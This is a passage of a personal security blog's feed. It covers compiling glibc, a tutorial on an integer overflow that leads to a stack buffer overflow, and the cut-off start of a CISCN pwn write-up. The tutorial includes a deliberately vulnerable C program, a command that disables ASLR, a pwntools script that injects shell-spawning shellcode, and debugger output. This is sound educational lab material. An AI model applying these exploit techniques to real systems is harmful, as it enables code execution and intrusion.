operator">-</span><span class="token keyword">char</span> <span class="token operator">*</span>loc2<span class="token punctuation">;</span><span class="token operator">+</span><span class="token comment" spellcheck="true">/* Define the variables used for the interface.  Avoid .symver on common+   symbol, which just creates a new common symbol, not an alias.  */</span><span class="token operator">+</span><span class="token keyword">char</span> <span class="token operator">*</span>loc1 <span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>nocommon<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">+</span><span class="token keyword">char</span> <span class="token operator">*</span>loc2 <span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>nocommon<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">compat_symbol</span> <span class="token punctuation">(</span>libc<span class="token punctuation">,</span> loc1<span class="token punctuation">,</span> loc1<span class="token punctuation">,</span> GLIBC_2_0<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">compat_symbol</span> <span class="token punctuation">(</span>libc<span class="token punctuation">,</span> loc2<span class="token punctuation">,</span> loc2<span class="token punctuation">,</span> GLIBC_2_0<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* Although we do not support the use we define this variable as well.  */</span><span class="token operator">-</span><span class="token keyword">char</span> <span class="token operator">*</span>locs<span class="token punctuation">;</span><span class="token operator">+</span><span class="token keyword">char</span> <span class="token operator">*</span>locs <span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>nocommon<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">compat_symbol</span> <span class="token punctuation">(</span>libc<span class="token punctuation">,</span> locs<span class="token punctuation">,</span> locs<span class="token punctuation">,</span> GLIBC_2_0<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Just add <code>__attribute__ ((nocommon))</code> behind the <code>*loc</code>Ôºåthen you can solve this error;</p><h3 id="step3-make-install"><a href="#step3-make-install" class="headerlink" title="step3: make install"></a>step3: make install</h3><p>After <code>make install</code>, you can find the libc.so compiled by yourself in build directory, and ld.so is in elf directory.</p><h3 id="Notes"><a href="#Notes" class="headerlink" title="Notes:"></a>Notes:</h3><p>Although the same version of libc may also have diffrent offset because of the diffrent args in compiling time.</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190720154352.png" alt=""></p><h2 id="Using-The-Compiled-Glibc-To-Compile-Program"><a href="#Using-The-Compiled-Glibc-To-Compile-Program" class="headerlink" title="Using The Compiled Glibc To Compile Program"></a>Using The Compiled Glibc To Compile Program</h2><p><code>Instructions</code>:</p><pre class=" language-bash"><code class="language-bash">gcc -g -fno-stack-protector -z execstack size_over.c -o size_over -Wl,--rpath<span class="token operator">=</span>/root/glibc_source/glibc2.23_build/ -Wl,--dynamic-linker<span class="token operator">=</span>/root/glibc_source/glibc2.23_build/elf/ld-linux-x86-64.so.2</code></pre><p><code>compile program</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190720161136.png" alt=""></p><p><code>libs infomation</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190720161116.png" alt=""></p><p><code>Use gdb to debug in underlying source level</code>Ôºö</p><p>reference: <a href="https://stackoverflow.com/questions/29955609/include-source-code-of-malloc-c-in-gdb" target="_blank" rel="noopener">https://stackoverflow.com/questions/29955609/include-source-code-of-malloc-c-in-gdb</a></p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190720161923.png" class="lazyload"></p><h2 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h2><p>So cool it isüòÑ!</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;If you want to learn some fantastic and advance technique about Security, You have to command some fundamental knowledge‚Ä¶‚Ä¶&lt;/p&gt;
    
    </summary>
    
      <category term="Binary" scheme="http://www.yof3ng.xyz/categories/Binary/"/>
    
    
      <category term="Binary" scheme="http://www.yof3ng.xyz/tags/Binary/"/>
    
      <category term="Compile" scheme="http://www.yof3ng.xyz/tags/Compile/"/>
    
  </entry>
  
  <entry>
    <title>Integer_Overflow</title>
    <link href="http://www.yof3ng.xyz/2019/07/19/Integer-Overflow/"/>
    <id>http://www.yof3ng.xyz/2019/07/19/Integer-Overflow/</id>
    <published>2019-07-19T03:06:53.000Z</published>
    <updated>2019-07-19T09:04:12.079Z</updated>
    
    <content type="html"><![CDATA[<p>Buffer overflow triggered by integer overflow‚òï‚Ä¶‚Ä¶</p><a id="more"></a><p>[TOC]</p><h1 id="Integer-Overflow"><a href="#Integer-Overflow" class="headerlink" title="Integer_Overflow"></a>Integer_Overflow</h1><blockquote><p>I have learned the <code>size_t ==&gt; unsigned char</code> integer overflowüôÉ‚Ä¶</p></blockquote><h2 id="Example-Source-Code"><a href="#Example-Source-Code" class="headerlink" title="Example Source Code"></a>Example Source Code</h2><p><code>Instructions to compile:</code></p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">echo</span> 0 <span class="token operator">></span> /proc/sys/kernel/randomize_va_spacegcc -g -fno-stack-protector -z execstack size_over.c -o size_over</code></pre><p><code>size_over.c</code></p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">void</span> <span class="token function">validate_msg</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>msg<span class="token punctuation">,</span><span class="token keyword">int</span> msg_size<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> msg_buf<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">unsigned</span> <span class="token keyword">char</span> msg_len <span class="token operator">=</span> msg_size<span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n[+]msg_len:%d \n"</span><span class="token punctuation">,</span>msg_len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>msg_len <span class="token operator">>=</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> msg_len <span class="token operator">&lt;=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"good!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">strcpy</span><span class="token punctuation">(</span>msg_buf<span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    size_t msg_size<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Input the size:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>msg_size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> payload<span class="token punctuation">[</span><span class="token number">1000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">,</span>msg_size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//printf("%s\n",payload);</span>    <span class="token function">validate_msg</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span>msg_size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="Exploit-script"><a href="#Exploit-script" class="headerlink" title="Exploit script"></a>Exploit script</h2><blockquote><p>Here is my exploit script‚Ä¶</p><p>Maybe i should spend some time to learn Underlying libc‚Ä¶</p><p>From this example, we can know more about the way through overflow to execute shellcode in stack and the influence of <code>\x00</code>‚Ä¶‚Ä¶</p><p>Normally, execute shellcode in stack should make sure NX disabled‚Ä¶And hijacking program go to stack by using gadget <code>jmp esp</code>,or control Eip while knowing stack address‚Ä¶</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>shellcode <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># diffrent enviroment has diffrent address......here is test result of my computer......</span>rbp <span class="token operator">=</span> <span class="token number">0x7fffffffdcb0</span>shellcode_addr <span class="token operator">=</span> <span class="token number">0x7fffffffdcb0</span> <span class="token operator">+</span> <span class="token number">0x30</span><span class="token comment" spellcheck="true"># padding(12+8) + shellcode_addr(8)  </span>payload <span class="token operator">=</span> <span class="token string">""</span>payload <span class="token operator">+=</span> <span class="token number">12</span> <span class="token operator">*</span> <span class="token string">"a"</span>payload <span class="token operator">+=</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token string">"b"</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>shellcode_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token number">0x20</span><span class="token operator">*</span><span class="token string">"\x90"</span>payload <span class="token operator">+=</span> shellcodepayload  <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">260</span><span class="token punctuation">,</span><span class="token string">"\x90"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./size_over'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(p)</span><span class="token comment" spellcheck="true">#pause()</span><span class="token comment" spellcheck="true">#p.recvuntil(":")</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'260\n'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><code>Running to ret2shellcode_addr</code>:</p><pre class=" language-python"><code class="language-python">pwndbg<span class="token operator">></span> ni<span class="token number">0x00005555555551dc</span> <span class="token keyword">in</span> ?? <span class="token punctuation">(</span><span class="token punctuation">)</span>LEGEND<span class="token punctuation">:</span> STACK <span class="token operator">|</span> HEAP <span class="token operator">|</span> CODE <span class="token operator">|</span> DATA <span class="token operator">|</span> RWX <span class="token operator">|</span> RODATA‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ<span class="token punctuation">[</span> REGISTERS <span class="token punctuation">]</span>‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ RAX  <span class="token number">0x7fffffffdca4</span> ‚óÇ‚Äî <span class="token number">0x6161616161616161</span> <span class="token punctuation">(</span><span class="token string">'aaaaaaaa'</span><span class="token punctuation">)</span> RBX  <span class="token number">0x0</span> RCX  <span class="token number">0xffffdce062626262</span> RDX  <span class="token number">0x7fffff</span> RDI  <span class="token number">0x7fffffffdcb4</span> ‚óÇ‚Äî <span class="token number">0xffffdce062626262</span> RSI  <span class="token number">0x7fffffffdcd0</span> ‚óÇ‚Äî <span class="token number">0xffffdce062626262</span> R8   <span class="token number">0x7ffff7f9e500</span> ‚óÇ‚Äî add    ch<span class="token punctuation">,</span> ah <span class="token operator">/</span><span class="token operator">*</span> <span class="token number">0x7ffff7f9e500</span> <span class="token operator">*</span><span class="token operator">/</span> R9   <span class="token number">0x7fffffffdb67</span> ‚óÇ‚Äî <span class="token number">0xa87c57a943ef0034</span> <span class="token operator">/</span><span class="token operator">*</span> <span class="token string">'4'</span> <span class="token operator">*</span><span class="token operator">/</span> R10  <span class="token number">0xfffffffffffff4a8</span> R11  <span class="token number">0x7ffff7f58a60</span> ‚óÇ‚Äî add    byte ptr <span class="token punctuation">[</span>rdx<span class="token punctuation">]</span><span class="token punctuation">,</span> cl R12  <span class="token number">0x555555555090</span> ‚óÇ‚Äî xor    ebp<span class="token punctuation">,</span> ebp R13  <span class="token number">0x7fffffffe190</span> ‚óÇ‚Äî <span class="token number">0x1</span> R14  <span class="token number">0x0</span> R15  <span class="token number">0x0</span> RBP  <span class="token number">0x6262626262626262</span> <span class="token punctuation">(</span><span class="token string">'bbbbbbbb'</span><span class="token punctuation">)</span> RSP  <span class="token number">0x7fffffffdcb8</span> ‚Äî‚ñ∏ <span class="token number">0x7fffffffdce0</span> ‚óÇ‚Äî <span class="token number">0x9090909090909090</span> RIP  <span class="token number">0x5555555551dc</span> ‚óÇ‚Äî ret    ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ<span class="token punctuation">[</span> DISASM <span class="token punctuation">]</span>‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ   <span class="token number">0x5555555551ce</span>    lea    rdi<span class="token punctuation">,</span> qword ptr <span class="token punctuation">[</span>rip <span class="token operator">+</span> <span class="token number">0xe46</span><span class="token punctuation">]</span>   <span class="token number">0x5555555551d5</span>    call   <span class="token number">0x555555555040</span>   <span class="token number">0x5555555551da</span>    nop       <span class="token number">0x5555555551db</span>    leave   ‚ñ∫ <span class="token number">0x5555555551dc</span>    ret    <span class="token operator">&lt;</span><span class="token number">0x7fffffffdce0</span><span class="token operator">></span>   <span class="token number">0x5555555551dd</span>    push   rbp   <span class="token number">0x5555555551de</span>    mov    rbp<span class="token punctuation">,</span> rsp   <span class="token number">0x5555555551e1</span>    sub    rsp<span class="token punctuation">,</span> <span class="token number">0x3f0</span>   <span class="token number">0x5555555551e8</span>    lea    rdi<span class="token punctuation">,</span> qword ptr <span class="token punctuation">[</span>rip <span class="token operator">+</span> <span class="token number">0xe31</span><span class="token punctuation">]</span>   <span class="token number">0x5555555551ef</span>    mov    eax<span class="token punctuation">,</span> <span class="token number">0</span>   <span class="token number">0x5555555551f4</span>    call   <span class="token number">0x555555555050</span>‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ<span class="token punctuation">[</span> STACK <span class="token punctuation">]</span>‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ<span class="token number">00</span><span class="token punctuation">:</span><span class="token number">0000</span>‚îÇ rsp  <span class="token number">0x7fffffffdcb8</span> ‚Äî‚ñ∏ <span class="token number">0x7fffffffdce0</span> ‚óÇ‚Äî <span class="token number">0x9090909090909090</span><span class="token number">01</span><span class="token punctuation">:</span><span class="token number">0008</span>‚îÇ      <span class="token number">0x7fffffffdcc0</span> ‚óÇ‚Äî <span class="token number">0x6161616161616161</span> <span class="token punctuation">(</span><span class="token string">'aaaaaaaa'</span><span class="token punctuation">)</span><span class="token number">02</span><span class="token punctuation">:</span><span class="token number">0010</span>‚îÇ      <span class="token number">0x7fffffffdcc8</span> ‚óÇ‚Äî <span class="token number">0x6262626261616161</span> <span class="token punctuation">(</span><span class="token string">'aaaabbbb'</span><span class="token punctuation">)</span><span class="token number">03</span><span class="token punctuation">:</span><span class="token number">0018</span>‚îÇ rsi  <span class="token number">0x7fffffffdcd0</span> ‚óÇ‚Äî <span class="token number">0xffffdce062626262</span><span class="token number">04</span><span class="token punctuation">:</span><span class="token number">0020</span>‚îÇ      <span class="token number">0x7fffffffdcd8</span> ‚óÇ‚Äî <span class="token number">0x9090909000007fff</span><span class="token number">05</span><span class="token punctuation">:</span><span class="token number">0028</span>‚îÇ      <span class="token number">0x7fffffffdce0</span> ‚óÇ‚Äî <span class="token number">0x9090909090909090</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> ‚Üì‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ<span class="token punctuation">[</span> BACKTRACE <span class="token punctuation">]</span>‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ ‚ñ∫ f <span class="token number">0</span>     <span class="token number">5555555551dc</span>   f <span class="token number">1</span>     <span class="token number">7fffffffdce0</span>   f <span class="token number">2</span> <span class="token number">6161616161616161</span>   f <span class="token number">3</span> <span class="token number">6262626261616161</span>   f <span class="token number">4</span> ffffdce062626262   f <span class="token number">5</span> <span class="token number">9090909000007fff</span>   f <span class="token number">6</span> <span class="token number">9090909090909090</span>   f <span class="token number">7</span> <span class="token number">9090909090909090</span>   f <span class="token number">8</span> <span class="token number">9090909090909090</span>   f <span class="token number">9</span> b848686a90909090   f <span class="token number">10</span> <span class="token number">732f2f2f6e69622f</span>‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄpwndbg<span class="token operator">></span> </code></pre><p><code>Exp Running Status</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190719161033.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Buffer overflow triggered by integer overflow‚òï‚Ä¶‚Ä¶&lt;/p&gt;
    
    </summary>
    
      <category term="Binary" scheme="http://www.yof3ng.xyz/categories/Binary/"/>
    
    
      <category term="Binary" scheme="http://www.yof3ng.xyz/tags/Binary/"/>
    
      <category term="Overflow" scheme="http://www.yof3ng.xyz/tags/Overflow/"/>
    
  </entry>
  
  <entry>
    <title>Ciscn_Pwn_Stack_Migration</title>
    <link href="http://www.yof3ng.xyz/2019/07/18/Ciscn-Pwn-Stack-Migration/"/>
    <id>http://www.yof3ng.xyz/2019/07/18/Ciscn-Pwn-Stack-Migration/</id>
    <published>2019-07-18T13:11:46.000Z</published>
    <updated>2019-07-19T12:15:28.844Z</updated>
    
    <content type="html"><![CDATA[<p>Stack migration in Ciscn‚Ä¶</p><a id="more"></a><h1 id="Ciscn-Pwn-Stack-Migration"><a href="#Ciscn-Pwn-Stack-Migration" class="headerlink" title="Ciscn_Pwn_Stack_Migration"></a>Ciscn_Pwn_Stack_Migration</h1><h2 id="Main-Source-Code"><a href="#Main-Source-Code" class="headerlink" title="Main Source Code"></a>Main Source Code</h2><p>main:</p><pre class=" language-c"><code class="language-c"><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span> <span class="token punctuation">;</span> <span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span>                 public main<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span> main            proc near               <span class="token punctuation">;</span> DATA XREF<span class="token punctuation">:</span> _start<span class="token operator">+</span><span class="token number">17</span>‚Üëo<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span> var_4           <span class="token operator">=</span> dword ptr <span class="token operator">-</span><span class="token number">4</span><span class="token 